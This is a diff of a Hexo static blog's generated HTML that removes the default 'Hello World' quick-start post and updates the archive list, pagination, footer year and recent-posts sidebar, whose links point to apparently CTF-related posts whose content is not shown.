-    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/10/12/hello-world/" class="article-date">
-  <time class="dt-published" datetime="2024-10-12T08:19:49.925Z" itemprop="datePublished">2024-10-12</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/10/12/hello-world/">Hello World</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/10/12/hello-world/" data-id="cm25w5snm0000i4vqcloe5ac3" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/11/01/MISC/" data-id="cm8a8wwb40000mcvqal34hre6" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -288,6 +726,11 @@
 
   
 
+
+  <nav id="page-nav">
+    
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+  </nav>
 
 </section>
         
@@ -305,7 +748,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/03/">March 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">December 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li></ul>
     </div>
   </div>
 
@@ -318,19 +761,23 @@
       <ul>
         
           <li>
-            <a href="/2024/10/27/post2/">(no title)</a>
+            <a href="/2025/03/15/web%E5%A4%8D%E7%8E%B01/">(no title)</a>
           </li>
         
           <li>
-            <a href="/2024/10/27/CTF%E5%85%A5%E9%97%A8/">(no title)</a>
+            <a href="/2024/12/26/%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/">(no title)</a>
           </li>
         
           <li>
-            <a href="/2024/10/27/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/">(no title)</a>
+            <a href="/2024/12/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">(no title)</a>
           </li>
         
           <li>
-            <a href="/2024/10/12/hello-world/">Hello World</a>
+            <a href="/2024/12/22/%E6%96%B0%E7%94%9F%E8%B5%9Bwp/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/12/19/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/">(no title)</a>
           </li>
         
       </ul>
@@ -346,7 +793,7 @@
   <div class="outer">
     <div id="footer-info" class="inner">
       
-      &copy; 2024 John Doe<br>
+      &copy; 2025 John Doe<br>
       Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
     </div>
   </div>
